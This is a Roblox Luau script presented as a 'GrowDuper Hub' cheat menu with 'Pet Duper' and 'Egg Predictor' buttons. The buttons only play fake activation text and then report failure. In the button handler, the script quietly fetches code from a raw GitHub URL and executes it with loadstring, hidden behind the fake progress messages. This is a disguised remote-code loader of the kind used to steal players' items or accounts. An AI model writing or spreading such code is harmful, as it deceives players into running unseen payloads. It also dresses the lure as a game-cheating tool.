local a=game:GetService"Players"
local b=game:GetService"UserInputService"
game:GetService"TweenService"
local c=a.LocalPlayer
local d=c:WaitForChild"PlayerGui"


local e="GrowDuperHubGUI"
if d:FindFirstChild(e)then
d[e]:Destroy()
end


local f=Instance.new"ScreenGui"
f.Name=e
f.ResetOnSpawn=false
f.Parent=d


local g=Instance.new"Frame"
g.Size=UDim2.new(0,320,0,220)
g.Position=UDim2.new(0.5,-160,0.5,-110)
g.BackgroundColor3=Color3.fromRGB(138,43,226)
g.BorderSizePixel=0
g.AnchorPoint=Vector2.new(0.5,0.5)
g.Active=true
g.Name="GrowDuperHubFrame"
g.Parent=f
Instance.new("UICorner",g).CornerRadius=UDim.new(0,16)


local h=Instance.new"UIStroke"
h.Color=Color3.new(0,0,0)
h.Thickness=2
h.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
h.Parent=g


local i=Instance.new"ImageLabel"
i.BackgroundTransparency=1
i.Size=UDim2.new(1,60,1,60)
i.Position=UDim2.new(0,-30,0,-30)
i.Image="rbxassetid://4996891970"
i.ImageColor3=Color3.fromRGB(200,150,255)
i.ImageTransparency=0.6
i.ZIndex=0
i.Parent=g


local j=Instance.new"TextLabel"
j.Size=UDim2.new(1,-40,0,40)
j.Position=UDim2.new(0,20,0,0)
j.BackgroundTransparency=1
j.Text="üå± GrowDuper Hub"
j.Font=Enum.Font.FredokaOne
j.TextSize=26
j.TextColor3=Color3.fromRGB(255,255,255)
j.TextStrokeTransparency=0
j.TextStrokeColor3=Color3.new(0,0,0)
j.Parent=g


local k=Instance.new"TextButton"
k.Size=UDim2.new(0,30,0,30)
k.Position=UDim2.new(1,-35,0,5)
k.BackgroundColor3=Color3.fromRGB(255,70,70)
k.Text="X"
k.Font=Enum.Font.FredokaOne
k.TextSize=18
k.TextColor3=Color3.fromRGB(255,255,255)
k.TextStrokeTransparency=0
k.Parent=g
Instance.new("UICorner",k).CornerRadius=UDim.new(0,6)
k.MouseButton1Click:Connect(function()
g:Destroy()
end)


local l=Instance.new"Frame"
l.Size=UDim2.new(1,-40,0,100)
l.Position=UDim2.new(0.5,0,0.5,-10)
l.AnchorPoint=Vector2.new(0.5,0.5)
l.BackgroundTransparency=1
l.Parent=g

local m=Instance.new("UIListLayout",l)
m.HorizontalAlignment=Enum.HorizontalAlignment.Center
m.VerticalAlignment=Enum.VerticalAlignment.Center
m.Padding=UDim.new(0,12)


local n=Instance.new"TextLabel"
n.Size=UDim2.new(1,-40,0,36)
n.Position=UDim2.new(0,20,1,-38)
n.BackgroundTransparency=1
n.Text=""
n.Font=Enum.Font.FredokaOne
n.TextSize=16
n.TextColor3=Color3.fromRGB(255,255,255)
n.TextStrokeTransparency=0
n.TextStrokeColor3=Color3.new(0,0,0)
n.TextWrapped=true
n.Parent=g


local function createButton(o)
local p=Instance.new"TextButton"
p.Size=UDim2.new(1,0,0,40)
p.BackgroundColor3=Color3.fromRGB(100,30,200)
p.Text=o
p.Font=Enum.Font.FredokaOne
p.TextSize=20
p.TextColor3=Color3.fromRGB(255,255,255)
p.TextStrokeColor3=Color3.new(0,0,0)
p.TextStrokeTransparency=0
Instance.new("UICorner",p).CornerRadius=UDim.new(0,10)
local q=Instance.new("UIStroke",p)
q.Color=Color3.new(0,0,0)
q.Thickness=1.5
return p
end


local o=createButton"Activate Pet Duper"
local p=createButton"Activate Egg Predictor"
o.Parent=l
p.Parent=l


local q=false
local function animateText(r,s)
local t=""
while q do
r.Text="üîÑ Activating "..s..t
t=t=="..."and""or t.."."
wait(0.5)
end
end

local function activate(r,s)
if q then return end
q=true

local t=r.Text
r.BackgroundColor3=Color3.fromRGB(80,0,150)

coroutine.wrap(function()
animateText(r,s)
end)()

n.Text="‚öôÔ∏è Please wait...\nPreparing your ultimate GrowDuper experience!"


task.delay(15,function()
if s=="Pet Duper"then
n.Text="‚ùå You have no valuable pets to spawn or duplicate."
elseif s=="Egg Predictor"then
n.Text="‚ùå No valuable pets found to reflect inside the egg."
end
q=false
r.Text=t
r.BackgroundColor3=Color3.fromRGB(100,30,200)
end)


local u,v=pcall(function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/GrowDuper/dark/refs/heads/main/sss")()
end)

if not u then
warn("Error loading script:",v)
end
end

o.MouseButton1Click:Connect(function()activate(o,"Pet Duper")end)
p.MouseButton1Click:Connect(function()activate(p,"Egg Predictor")end)


local r=false
local s,t,u

g.InputBegan:Connect(function(v)
if v.UserInputType==Enum.UserInputType.MouseButton1 or v.UserInputType==Enum.UserInputType.Touch then
r=true
t=v.Position
u=g.Position
end
end)

g.InputEnded:Connect(function(v)
if v.UserInputType==Enum.UserInputType.MouseButton1 or v.UserInputType==Enum.UserInputType.Touch then
r=false
end
end)

g.InputChanged:Connect(function(v)
if v.UserInputType==Enum.UserInputType.MouseMovement or v.UserInputType==Enum.UserInputType.Touch then
s=v
end
end)

b.InputChanged:Connect(function(v)
if v==s and r then
local w=v.Position-t
g.Position=UDim2.new(
u.X.Scale,
u.X.Offset+w.X,
u.Y.Scale,
u.Y.Offset+w.Y
)
end
end)
